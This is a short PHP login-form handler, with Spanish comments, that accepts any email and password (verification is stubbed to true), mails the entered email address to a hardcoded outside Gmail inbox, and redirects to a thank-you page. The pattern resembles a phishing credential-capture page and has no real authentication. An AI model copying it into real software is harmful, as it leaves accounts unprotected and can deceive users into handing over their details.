<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST["correo"];
    $contrasena = $_POST["contrasena"];

    // Verificar las credenciales (esto debe hacerse de manera segura)
    $credenciales_correctas = true;

    if ($credenciales_correctas) {
        // Enviar correo electrónico
        $destinatario = "omardiazburgos588@gmail.com";
        $asunto = "Inicio de sesión exitoso";
        $mensaje = "Inicio de sesión exitoso para el correo: $correo";

        // Puedes personalizar el encabezado según tus necesidades
        $headers = "From: webmaster@example.com\r\n";

        // Enviar el correo electrónico
        mail($destinatario, $asunto, $mensaje, $headers);

        // Redirigir a la página de agradecimiento
        header("Location: gracias.html");
        exit();
    } else {
        // Redirigir de nuevo a la página de inicio de sesión en caso de credenciales incorrectas
        header("Location: index.html");
        exit();
    }
}
?>
